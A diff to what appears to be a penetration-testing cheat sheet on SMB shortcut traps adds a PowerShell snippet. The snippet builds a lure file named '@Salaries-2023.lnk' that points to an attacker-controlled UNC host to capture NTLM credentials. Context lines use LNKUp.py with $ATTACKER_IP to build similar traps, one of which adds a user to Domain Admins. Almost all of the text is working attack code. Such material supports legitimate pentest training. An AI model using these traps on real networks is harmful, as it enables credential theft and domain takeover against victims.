@@ -112,6 +112,18 @@ LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.ln
 # SMB trap + command execution
 LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' Pentester01 /domain /add"
 ```
+```bash
+# Simple SMB trap with remote icon file (Powershell)
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Windows\temp\@Salaries-2023.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@icon.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Salaries-2023."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
 
 {% hint style="info" %}
 **Advanced traps**
